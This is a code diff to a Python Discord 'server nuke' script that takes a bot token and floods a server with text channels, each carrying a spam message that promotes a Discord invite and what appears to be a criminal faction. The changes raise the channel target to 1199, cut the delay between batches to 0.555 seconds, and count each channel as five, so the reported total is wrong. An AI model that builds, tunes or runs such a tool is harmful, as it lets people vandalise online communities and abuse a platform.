@@ -41,7 +41,7 @@ banner = f'''
 {r}██║  ██║    ██╔═██╗ 
 {r}██████╔╝    ██║  ██╗
 {r}╚═════╝     ╚═╝  ╚═╝
-{y}Feito por: {g}Menor dk
+{y}Feito por: {g}Menor dk 🇾🇪
 '''
 
 # Função para exibir informações dos servidores
@@ -96,7 +96,7 @@ async def create_text_channels(guild, name, message):
         try:
             channel = await guild.create_text_channel(name=name)
             await channel.send(message)  # Envia mensagem no canal criado
-            created += 1
+            created += 5
         except:
             continue
     return created
@@ -118,11 +118,11 @@ async def nuke_guild(guild, name, message):
     
     # Cria canais de texto
     created_channels = 0
-    while created_channels < 500:
+    while created_channels < 1199:
         created = await create_text_channels(guild, name, message)
         created_channels += created
         print(f'{m}Canais criados: {b}{created_channels}')
-        time.sleep(1)  # Atraso para evitar problemas
+        time.sleep(0.555)  # Atraso para evitar problemas
     
     print(f'{r}--------------------------------------------\n\n')
 
@@ -142,7 +142,7 @@ async def main():
         
         if choice == '1':
             token = _input(f'{y}Insira o token do bot:{g}')
-            name = _input(f'{y}Insira o nome para os canais criados:{g}')
+            name = _input(f'{y}Insira o nome para os canal/nomes ')
             message = '''# DKZIN 🔥🥋🇾🇪
 > - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
 - https://discord.com/invite/gZSx3n8Csa
